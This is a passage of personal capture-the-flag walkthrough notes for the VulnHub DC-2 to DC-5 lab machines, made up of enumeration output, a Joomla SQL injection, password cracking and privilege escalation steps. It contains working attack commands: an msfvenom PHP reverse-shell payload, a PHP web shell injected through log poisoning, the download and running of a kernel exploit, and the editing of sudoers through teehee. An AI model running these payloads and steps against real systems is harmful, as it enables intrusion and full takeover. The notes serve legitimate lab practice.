entry point.<br /><br />Flag 3:<br />Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br /><br />Flag 4:<br />Good to see that you&#39;ve made it this far - but you&#39;re not home yet. <br />You still need to get the final flag (the only flag that really counts!!!).  <br />No hints here - you&#39;re on your own now.  :-)<br />Go on - git outta here!!!!<br /><br />Flag 5:<br />final-flag.txt<br /># cat final-flag.txt<br /> __    __     _ _       _                    _ <br />/ / /\ \ \___| | |   __| | ___  _ __   ___  / \<br />\ \/  \/ / _ \ | |  / _` |/ _ \| &#39;_ \ / _ \/  /<br /> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ <br />  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   <br /><br /><br />Congratulatons!!!<br /><br />A special thanks to all those who sent me tweets<br />and provided me with feedback - it&#39;s all greatly<br />appreciated.<br /><br />If you enjoyed this CTF, send me a tweet via @DCAU7.<br /><br /># <br /><br /><br /><br /><br /><br /><br />export<br />PATH=/home/tom/usr/bin</div><div class='page'><h1 class='title level-5'>BruteForce</h1><br/>cewl -d 2 -m 5 -w cewlwords.txt <a href="http://dc-2/">http://dc-2/</a></div><div class='page'><h1 class='title level-4'>DC-3</h1><br/>nmap -sC -sV -p- 192.168.11.128 -oN DC-3.txt and found only port 80 open<br />ran dirsearch, and nikto, finding that it was running joomlah! <br />found joomlahVS and found that it was running Joomlah 3.7<br />after a quick google search I found the github project joomblah which exploits 3.7 via sql<br />I got a hash and a username from that and cracked it with john<br />now I can log in as admin!!<br />after poking aroung I found that <br />    extensions/templates/templates/Beeze had editable php files!<br />msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.11.128 LPORT=3232 -f raw -o PhpShell.php and uploaded the contents of phpshell.php to the website<br />I started a msf session to catch the reverse shell<br />on the website ran “template preview” and caught the shell<br /><br />ran a uname -a and saw 4.4.0-21-generic #37-Ubuntu<br />went on searchsploit and found a .txt that exploited the same vulnerability that a .rb(msf) did<br />the txt pointed me to a github project @ <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br />searchsploit -x exploits/linux/local/39772.txt<br />downloaded the exploit and got it onto the target via wget and SimpleHTTPServer<br />unzip ed the file<br />tar -xvf exploit.tar<br />./compile.sh<br />./doubleput<br />After a minute I am now root!!</div><div class='page'><h1 class='title level-5'>Enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-3# nmap -sC -sV -p- 192.168.11.128 -oN DC-3.txt<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-07 09:01 EDT<br />Nmap scan report for 192.168.11.128<br />Host is up (0.0031s latency).<br />Not shown: 65534 closed ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-generator: Joomla! - Open Source Content Management<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Home<br />MAC Address: 00:0C:29:F2:92:E4 (VMware)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-3# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.128">http://192.168.11.128</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-07_09-02-55.log<br /><br />Target: <a href="http://192.168.11.128">http://192.168.11.128</a><br /><br />[09:02:55] Starting: <br />[09:02:55] 403 -  293B  - /.php<br />[09:02:55] 200 -   31B  - /media/<br />[09:02:55] 200 -   31B  - /templates/<br />[09:02:55] 403 -  295B  - /icons/<br />[09:02:55] 200 -   31B  - /modules/<br />[09:02:55] 200 -   31B  - /images/<br />[09:02:56] 200 -    7KB - /index.php<br />[09:02:56] 200 -   31B  - /bin/<br />[09:02:56] 200 -   31B  - /plugins/<br />[09:02:56] 200 -   31B  - /includes/<br />[09:02:57] 200 -   31B  - /language/<br />[09:02:57] 200 -   31B  - /components/<br />[09:02:58] 200 -   31B  - /cache/<br />[09:02:58] 200 -   31B  - /libraries/<br />[09:03:03] 200 -   31B  - /tmp/<br />[09:03:04] 200 -   31B  - /layouts/<br />[09:03:09] 200 -    5KB - /administrator/<br />[09:03:17] 200 -    0B  - /configuration.php<br />[09:03:49] 200 -   31B  - /cli/<br />[09:07:08] 403 -  303B  - /server-status/<br /><br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/DC-3# <br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-3# nikto -host <a href="http://192.168.11.128:80">http://192.168.11.128:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.128<br />+ Target Hostname:    192.168.11.128<br />+ Target Port:        80<br />+ Start Time:         2019-10-07 09:03:45 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.18 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ IP address found in the &#39;location&#39; header. The IP is &quot;127.0.1.1&quot;.<br />+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &quot;127.0.1.1&quot;.<br />+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ DEBUG HTTP verb may show server debugging information. See <a href="http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx">http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx</a> for details.<br />+ OSVDB-8193: /index.php?module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.<br />+ OSVDB-3092: /administrator/: This might be interesting...<br />+ OSVDB-3092: /bin/: This might be interesting...<br />+ OSVDB-3092: /includes/: This might be interesting...<br />+ OSVDB-3092: /tmp/: This might be interesting...<br />+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.<br />+ /administrator/index.php: Admin login page/section found.<br />+ 8726 requests: 0 error(s) and 17 item(s) reported on remote host<br />+ End Time:           2019-10-07 09:04:44 (GMT-4) (59 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>JoomlaVS</h1><br/>root@kali:~/Desktop/Tools/joomlavs# ruby joomlavs.rb -u <a href="http://192.168.11.128">http://192.168.11.128</a> --scan-all<br /><br />----------------------------------------------------------------------<br /><br />     ██╗ ██████╗  ██████╗ ███╗   ███╗██╗      █████╗ ██╗   ██╗███████╗<br />     ██║██╔═══██╗██╔═══██╗████╗ ████║██║     ██╔══██╗██║   ██║██╔════╝<br />     ██║██║   ██║██║   ██║██╔████╔██║██║     ███████║██║   ██║███████╗<br />██   ██║██║   ██║██║   ██║██║╚██╔╝██║██║     ██╔══██║╚██╗ ██╔╝╚════██║<br />╚█████╔╝╚██████╔╝╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║ ╚████╔╝ ███████║<br /> ╚════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝<br /><br />----------------------------------------------------------------------<br /><br />[+] URL: <a href="http://192.168.11.128">http://192.168.11.128</a><br />[+] Started: Mon Oct  7 09:35:53 2019<br /><br />[+] Found 1 interesting headers.<br /> |  Server: Apache/2.4.18 (Ubuntu)<br />[!] Listing enabled: <a href="http://192.168.11.128/administrator/components/">http://192.168.11.128/administrator/components/</a><br />[!] Listing enabled: <a href="http://192.168.11.128/administrator/modules/">http://192.168.11.128/administrator/modules/</a><br />[!] Listing enabled: <a href="http://192.168.11.128/administrator/templates/">http://192.168.11.128/administrator/templates/</a><br /><br />[+] Joomla version 3.7.0 identified from admin manifest<br />[!] Found 0 vulnerabilities affecting this version of Joomla!<br /><br />[+] Scanning for vulnerable components...<br />[!] Found 2 vulnerable components.<br /><br />------------------------------------------------------------------<br /><br />[+] Name: COM_BIBLESTUDY - v9.1.1<br /> |  Location: <a href="http://192.168.11.128/administrator/components/com_biblestudy">http://192.168.11.128/administrator/components/com_biblestudy</a><br /> |  Manifest: <a href="http://192.168.11.128/administrator/components/com_biblestudy/biblestudy.xml">http://192.168.11.128/administrator/components/com_biblestudy/biblestudy.xml</a><br /> |  Description: JBS_INS_XML_DESCRIPTION<br /> |  Author: CWM Team<br /> |  Author URL: <a href="https://www.christianwebministries.org">https://www.christianwebministries.org</a><br /><br />[!] Title: Joomla Component com_biblestudy 1.5.0 (id) SQL Injection Exploit<br /> |  Reference: <a href="https://www.exploit-db.com/exploits/5710">https://www.exploit-db.com/exploits/5710</a><br /><br /><br />[!] Title: Joomla Component com_biblestudy LFI Vulnerability<br /> |  Reference: <a href="https://www.exploit-db.com/exploits/10943">https://www.exploit-db.com/exploits/10943</a><br /><br /><br />[!] Title: Joomla! Component Proclaim 9.1.1 - Arbitrary File Upload<br /> |  Reference: <a href="https://www.exploit-db.com/exploits/44164">https://www.exploit-db.com/exploits/44164</a><br /> |  Reference: <a href="http://www.cvedetails.com/cve/CVE-2018-7316">http://www.cvedetails.com/cve/CVE-2018-7316</a><br /><br /><br />[!] Title: Joomla! Component Proclaim 9.1.1 - Backup File Download<br /> |  Reference: <a href="https://www.exploit-db.com/exploits/44159">https://www.exploit-db.com/exploits/44159</a><br /> |  Reference: <a href="http://www.cvedetails.com/cve/CVE-2018-7317">http://www.cvedetails.com/cve/CVE-2018-7317</a><br /><br />------------------------------------------------------------------<br /><br />[+] Name: com_fields - v3.7.0<br /> |  Location: <a href="http://192.168.11.128/administrator/components/com_fields">http://192.168.11.128/administrator/components/com_fields</a><br /> |  Manifest: <a href="http://192.168.11.128/administrator/components/com_fields/fields.xml">http://192.168.11.128/administrator/components/com_fields/fields.xml</a><br /> |  Description: COM_FIELDS_XML_DESCRIPTION<br /> |  Author: Joomla! Project<br /> |  Author URL: <a href="http://www.joomla.org">www.joomla.org</a><br /><br />[!] Title: Joomla Component Fields - SQLi Remote Code Execution (Metasploit)<br /> |  Reference: <a href="https://www.exploit-db.com/exploits/44358">https://www.exploit-db.com/exploits/44358</a><br /><br />------------------------------------------------------------------<br /><br />[+] Scanning for vulnerable modules...<br />[!] Found 0 vulnerable modules.<br /><br />------------------------------------------------------------------<br /><br />[+] Scanning for vulnerable templates...<br />[!] Found 0 vulnerable templates.<br /><br />------------------------------------------------------------------<br /><br />[+] Finished<br /></div><div class='page'><h1 class='title level-6'>JoomScan</h1><br/>    ____  _____  _____  __  __  ___   ___    __    _  _ <br />   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )<br />  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( <br />  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)<br />			(1337.today)<br />   <br />    --=[OWASP JoomScan<br />    +---++---==[Version : 0.0.7<br />    +---++---==[Update Date : [2018/09/23]<br />    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo<br />    --=[Code name : Self Challenge<br />    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP<br /><br />Processing <a href="http://192.168.11.128">http://192.168.11.128</a> ...<br /><br /><br /><br />[+] FireWall Detector<br />[++] Firewall not detected<br /><br />[+] Detecting Joomla Version<br />[++] Joomla 3.7.0<br /><br />[+] Core Joomla Vulnerability<br />[++] Target Joomla core is not vulnerable<br /><br />[+] Checking Directory Listing<br />[++] directory has directory listing : <br /><a href="http://192.168.11.128/administrator/components">http://192.168.11.128/administrator/components</a><br /><a href="http://192.168.11.128/administrator/modules">http://192.168.11.128/administrator/modules</a><br /><a href="http://192.168.11.128/administrator/templates">http://192.168.11.128/administrator/templates</a><br /><a href="http://192.168.11.128/images/banners">http://192.168.11.128/images/banners</a><br /><br /><br />[+] Checking apache info/status files<br />[++] Readable info/status files are not found<br /><br />[+] admin finder<br />[++] Admin page : <a href="http://192.168.11.128/administrator/">http://192.168.11.128/administrator/</a><br /><br />[+] Checking robots.txt existing<br />[++] robots.txt is not found<br /><br />[+] Finding common backup files name<br />[++] Backup files are not found<br /><br />[+] Finding common log files name<br />[++] error log is not found<br /><br />[+] Checking sensitive config.php.x file<br />[++] Readable config files are not found<br /><br /><br />Your Report : reports/192.168.11.128/<br />root@kali:~/Desktop/Tools/Joomla/joomscan# <br /></div><div class='page'><h1 class='title level-6'>Joomblah</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-3/Joomblah# python joomblah.py <a href="http://192.168.11.128/">http://192.168.11.128/</a><br />                                                                                                                    <br />    .---.    .-&#39;&#39;&#39;-.        .-&#39;&#39;&#39;-.                                                           <br />    |   |   &#39;   _    \     &#39;   _    \                            .---.                        <br />    &#39;---&#39; /   /` &#39;.   \  /   /` &#39;.   \  __  __   ___   /|        |   |            .           <br />    .---..   |     \  &#39; .   |     \  &#39; |  |/  `.&#39;   `. ||        |   |          .&#39;|           <br />    |   ||   &#39;      |  &#39;|   &#39;      |  &#39;|   .-.  .-.   &#39;||        |   |         &lt;  |           <br />    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           <br />    |   | `.   ` ..&#39; /   `.   ` ..&#39; /  |  |  |  |  |  |||/&#39;__ &#39;. |   | .:--.&#39;.  | | .&#39;&#39;&#39;-.    <br />    |   |    &#39;-...-&#39;`       &#39;-...-&#39;`   |  |  |  |  |  ||:/`  &#39;. &#39;|   |/ |   \ | | |/.&#39;&#39;&#39;. \   <br />    |   |                              |  |  |  |  |  |||     | ||   |`&quot; __ | | |  /    | |   <br />    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   <br /> __.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   <br />|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  <br />|____.&#39;                                                                `--&#39;  `&quot; &#39;---&#39;   &#39;---&#39; <br /><br /> [-] Fetching CSRF token<br /> [-] Testing SQLi<br />  -  Found table: d8uea_users<br />  -  Found table: users<br />  -  Extracting users from d8uea_users<br /> [$] Found user [&#39;629&#39;, &#39;admin&#39;, &#39;admin&#39;, &#39;freddy@norealaddress.net&#39;, &#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39;, &#39;&#39;, &#39;&#39;]<br />  -  Extracting sessions from d8uea_session<br />  -  Extracting users from users<br />  -  Extracting sessions from session<br /></div><div class='page'><h1 class='title level-6'>john</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-3# john hash.txt<br />Using default input encoding: UTF-8<br />Loaded 1 password hash (bcrypt [Blowfish 32/32 X2])<br />Cost 1 (iteration count) is 1024 for all loaded hashes<br />Will run 8 OpenMP threads<br />Proceeding with single, rules:Single<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />Almost done: Processing the remaining buffered candidate passwords, if any.<br />Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist<br />snoopy           (?)<br />1g 0:00:00:00 DONE 2/3 (2019-10-07 11:53) 4.545g/s 218.1p/s 218.1c/s 218.1C/s 123456..diamond<br />Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br />Session completed<br /></div><div class='page'><h1 class='title level-5'>flag</h1><br/>cat the-flag.txt<br /> __        __   _ _   ____                   _ _ _ _ <br /> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |<br />  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |<br />   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|<br />    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)<br />                                                     <br /><br />Congratulations are in order for completing DC-3VM.  :-)<br /><br />I hope you&#39;ve enjoyed this challenge as much as I enjoyed making it.<br /><br />If there are any ways that I can improve these little challenges,<br />please let me know.<br /><br />As per usual, comments and complaints can be sent via Twitter to @DCAU7<br /><br />Have a great day!!!!<br /></div><div class='page'><h1 class='title level-4'>DC-4</h1><br/>nmap -sC -sV -p- 192.168.11.129 -oN DC-4.txt        and saw only port 80 open<br />dirb and nikto gave me minimal help<br />looked at page source to see how to format wfuzz command<br />ran wfuzz with big.txt and admin and was able to find the admin password “happy”<br />was able to run limited commands through webpage<br />caught in burp and found that I could run my own commands!<br />went to pentestmonkey and got the python one liner, to run<br />cought with nc -nlvp 3232!<br />as www-data I was able to look in the other users profiles<br />found old-passwords.bak under jims backups<br />copied the file from screen and put in a text document<br />ran with hydra against the known user accounts<br />found the jim password jibril04<br />logged in with ssh!<br />find / -perm 4000       and saw that jim had new mail<br />I read the email and got charles&#39; password ^xHhA&amp;hvim0y<br />ssh&#39;d into charles!<br />sudo -l              and saw that we could teehee<br />sudo teehee -a /etc/sudoers<br />charles    ALL=(ALL:ALL) ALL<br />log out/log in<br />sudo /bin/bash<br />found final flag.txt!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-4# nmap -sC -sV -p- 192.168.11.129 -oN DC-4.txt<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-07 14:13 EDT<br />Nmap scan report for 192.168.11.129<br />Host is up (0.00041s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)<br />|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)<br />|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)<br />80/tcp open  http    nginx 1.15.10<br />|_http-server-header: nginx/1.15.10<br />|_http-title: System Tools<br />MAC Address: 00:0C:29:16:95:73 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-4# nikto -host <a href="http://192.168.11.129:80">http://192.168.11.129:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.129<br />+ Target Hostname:    192.168.11.129<br />+ Target Port:        80<br />+ Start Time:         2019-10-07 14:16:15 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: nginx/1.15.10<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Cookie PHPSESSID created without the httponly flag<br />+ 7915 requests: 0 error(s) and 4 item(s) reported on remote host<br />+ End Time:           2019-10-07 14:16:30 (GMT-4) (15 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-5'>flag</h1><br/>root@dc-4:~# cat flag.txt<br /><br /><br /><br />888       888          888 888      8888888b.                             888 888 888 888 <br />888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 <br />888  d8b  888          888 888      888    888                            888 888 888 888 <br />888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 <br />888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 <br />88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br />8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  <br />888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 <br /><br /><br />Congratulations!!!<br /><br />Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br />who have provided feedback, and who have taken time to complete these little<br />challenges.<br /><br />If you enjoyed this CTF, send me a tweet via @DCAU7.<br /></div><div class='page'><h1 class='title level-4'>DC-5</h1><br/>nmap -sC -sV -p- 192.168.11.129 -oN DC-5.txt        and saw only port 80 open<br />dirb gave little help<br />nikto gave little help<br />wfuzz with and without cewl did not help<br />ran wfuzz for LFI and found that I could view /etc/passwd as well as some other files<br />(although blind) I found that I could perform log poisioning by adding ---GET /thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;])?&gt;=== to a burp request<br />from there I could run /var/log/nginx/error.log&amp;cmd=whoami (in burp) and see the result www-data!<br />now I replaced whoami with a python oneliner from pentestmonkey and caught it with a nc listener<br /><br />ran the find privs command and found that a vulnerable version of screen would be run as root<br />found the exploit in searchsploit and downloaded it.<br />compiled the code (on my debian 64 machine). The code between the EOF piecees. <br />I then moved the files over to the targer <br />chmod 777 41154.sh<br />run 41154.sh ....and...BOOM. I should be root... but I am pretty sure I messed one of the /etc/xxx.so files. I am not restarting yeet.</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>nmap -sC -sV -p- 192.168.11.130 -oN DC-5.txt <br /><br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.130">http://192.168.11.130</a><br /><br />nikto -host <a href="http://192.168.11.130:80">http://192.168.11.130:80</a><br /><br />cewl -d 2 -m 5 -w cewlwords.txt <a href="http://192.168.11.130">http://192.168.11.130</a><br /><br /><code>python sqlmap -r GET_Request -p &quot;def&quot; --dbs --threads 5</code><br /><br />sqlmap -u &quot;<a href="http://192.168.11.130/thankyou.php?firstname=chris&lastname=larry&country=australia&subject=whoami"">http://192.168.11.130/thankyou.php?firstname=*&amp;lastname=*&amp;country=*&amp;subject=whoami&quot;</a> --risk=3 --level=5 &gt;<br /><br />wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u <a href="http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z">http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z</a> | grep -v 851 | grep -v 835 &gt; LFIList.txt<br /><br /><br />xxj31ZMTZzkVA</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-5# nmap -sC -sV -p- 192.168.11.130 -oN DC-5.txt<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-07 16:23 EDT<br />Nmap scan report for 192.168.11.130<br />Host is up (0.00045s latency).<br />Not shown: 65532 closed ports<br />PORT      STATE SERVICE VERSION<br />80/tcp    open  http    nginx 1.6.2<br />|_http-server-header: nginx/1.6.2<br />|_http-title: Welcome<br />111/tcp   open  rpcbind 2-4 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2,3,4        111/tcp  rpcbind<br />|   100000  2,3,4        111/udp  rpcbind<br />|   100024  1          34757/tcp  status<br />|_  100024  1          53168/udp  status<br />34757/tcp open  status  1 (RPC #100024)<br />MAC Address: 00:0C:29:4C:F6:10 (VMware)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-5# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.130">http://192.168.11.130</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-08_09-24-46.log<br /><br />Target: <a href="http://192.168.11.130">http://192.168.11.130</a><br /><br />[09:24:46] Starting: <br />[09:24:46] 403 -  570B  - /images/<br />[09:24:46] 200 -    4KB - /index.php<br />[09:24:47] 200 -    4KB - /contact.php<br />[09:24:47] 200 -    6KB - /faq.php<br />[09:24:47] 200 -    4KB - /solutions.php<br />[09:24:47] 200 -   17B  - /footer.php<br />[09:24:48] 403 -  570B  - /css/<br />[09:24:49] 200 -    4KB - /about-us.php<br />[09:25:10] 200 -  852B  - /thankyou.php<br />Task Completed</div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-5# nikto -host <a href="http://192.168.11.130:80">http://192.168.11.130:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.130<br />+ Target Hostname:    192.168.11.130<br />+ Target Port:        80<br />+ Start Time:         2019-10-07 16:27:10 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: nginx/1.6.2<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ 7915 requests: 0 error(s) and 3 item(s) reported on remote host<br />+ End Time:           2019-10-07 16:27:27 (GMT-4) (17 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>cewl</h1><br/></div><div class='page'><h1 class='title level-6'>wfuzz</h1><br/>wfuzz -c -z file,cewlwords.txt -d &quot;username=admin&amp;password=FUZZ&quot; <a href="http://192.168.11.129/login.php">http://192.168.11.129/login.php</a> | grep -v 206<br /><br />wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u <a href="http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z">http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z</a> | grep -v 851 | grep -v 835 &gt; LFIList.txt<br /><br /><a href="file:///usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt">/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</a><br /><br /><br />000001:  C=200     70 L	     104 W	   2319 Ch	  &quot;/etc/passwd&quot;<br />000077:  C=200     96 L	     117 W	   1558 Ch	  &quot;/etc/group&quot;<br />000153:  C=200     42 L	      66 W	    908 Ch	  &quot;/proc/self/cmdline&quot;<br />000191:  C=200     43 L	     115 W	   1147 Ch	  &quot;/proc/self/stat&quot;<br />000229:  C=200     83 L	     164 W	   1622 Ch	  &quot;/proc/self/status&quot;<br />006064:  C=500     38 L	      58 W	    786 Ch	  &quot;/etc/php5/apache2/php.ini&quot;<br />006482:  C=500     38 L	      58 W	    786 Ch	  &quot;/etc/php5/cgi/php.ini&quot;<br />007470:  C=200    170 L	     590 W	   4368 Ch	  &quot;/etc/mysql/my.cnf&quot;<br /></div><div class='page'><h1 class='title level-6'>passwd</h1><br/>root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/usr/sbin/nologin<br />man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br />lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br />mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br />news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br />uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br />proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br />www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br />backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br />list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br />irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br />nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br />systemd-timesync:x:100:103:systemd Time 